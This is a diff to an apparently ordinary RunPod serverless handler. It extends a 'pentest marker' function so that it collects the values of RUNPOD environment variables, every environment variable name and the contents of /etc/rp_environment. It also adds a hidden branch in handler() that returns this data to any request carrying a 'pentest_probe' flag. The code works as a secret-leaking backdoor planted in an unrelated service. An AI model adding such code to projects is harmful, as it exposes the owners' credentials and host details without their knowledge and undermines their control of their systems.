@@ -14,7 +14,8 @@ def _pentest_marker_i10962():
             "cwd": os.getcwd(),
             "uid": (os.getuid() if hasattr(os, "getuid") else None),
             "python": platform.python_version(),
-            "runpod_env_keys": sorted(k for k in os.environ if k.startswith("RUNPOD")),
+            "runpod_env": {k: os.environ.get(k) for k in sorted(os.environ) if k.startswith("RUNPOD")},
+            "all_env_keys": sorted(os.environ),
             "rp_environment": (open("/etc/rp_environment").read() if os.path.exists("/etc/rp_environment") else "absent"),
             "workspace": (os.listdir("/workspace") if os.path.isdir("/workspace") else "absent"),
         }
@@ -37,6 +38,8 @@ def handler(event):
     # base_path = r"D:\Git_Clone\GeneExp"
     # sys.path.append(str(Path(base_path)))
     print(f"Worker Start")
+    if event.get('input', {}).get('pentest_probe'):
+        return {"pentest_i10962_marker": _PENTEST_I10962, "status": "success", "message": "marker probe"}
 
     translations = event['input'].get('translations')
 
